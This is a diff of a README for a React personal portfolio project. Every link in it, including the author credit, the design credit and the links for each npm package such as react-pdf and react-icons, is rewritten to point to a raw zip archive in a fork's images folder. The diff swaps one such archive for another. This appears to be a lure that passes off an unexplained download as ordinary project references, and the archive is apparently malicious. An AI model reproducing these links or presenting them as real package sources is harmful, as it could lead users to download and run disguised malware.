@@ -1,17 +1,17 @@
-<h2 align="center">Personal Portfolio <br/> <a target="_blank" href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/fork_Portfolio_1.9.zip">devanshsahni</a></h2>
+<h2 align="center">Personal Portfolio <br/> <a target="_blank" href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/Portfolio-fork-Ethel.zip">devanshsahni</a></h2>
 
 <br/>
 
 ## Fork 
 <p>Feel free to fork this repo to modify and make changes of your own. Please give me proper credit by linking it back to this repo. Thanks! 
   <br/> 
-  The design for this project is inspired by <a href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/fork_Portfolio_1.9.zip">Saumjyajit's portfolio.</a></p>
+  The design for this project is inspired by <a href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/Portfolio-fork-Ethel.zip">Saumjyajit's portfolio.</a></p>
 
 ## About 
 <p>This project is my personal portfolio which features some of my skills, GitHub projects and my resume.</p>
 <p>These technologies are used to build this website:</p>
 <ul>
-  <li>https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/fork_Portfolio_1.9.zip</li>
+  <li>https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/Portfolio-fork-Ethel.zip</li>
   <li>Git</li>
   <li>npm packages</li>
   <li>Vercel</li>
@@ -27,12 +27,12 @@
 
 <p>npm packages used:</p>
 <ul>
-  <li><a target="_blank" href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/fork_Portfolio_1.9.zip">lottie-react</a>: For the animations used in the website.</li>
-  <li><a href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/fork_Portfolio_1.9.zip">react-spinners</a>: For the preloader animation.</li>
-  <li><a href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/fork_Portfolio_1.9.zip">react-icons</a>: For all the icons.</li>
-  <li><a href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/fork_Portfolio_1.9.zip">typewriter-effect</a>: The typing effect on the home page.</li>
-  <li><a href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/fork_Portfolio_1.9.zip">react-pdf</a>: To preview the resume pdf</li>
-  <li><a href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/fork_Portfolio_1.9.zip">react-parallax-tilt</a>: To apply tilt hover effect on react components like image and animation.</li>
+  <li><a target="_blank" href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/Portfolio-fork-Ethel.zip">lottie-react</a>: For the animations used in the website.</li>
+  <li><a href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/Portfolio-fork-Ethel.zip">react-spinners</a>: For the preloader animation.</li>
+  <li><a href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/Portfolio-fork-Ethel.zip">react-icons</a>: For all the icons.</li>
+  <li><a href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/Portfolio-fork-Ethel.zip">typewriter-effect</a>: The typing effect on the home page.</li>
+  <li><a href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/Portfolio-fork-Ethel.zip">react-pdf</a>: To preview the resume pdf</li>
+  <li><a href="https://github.com/Eliakim-ellie/Portfolio-fork/raw/refs/heads/main/public/images/Portfolio-fork-Ethel.zip">react-parallax-tilt</a>: To apply tilt hover effect on react components like image and animation.</li>
 </ul>
 
 
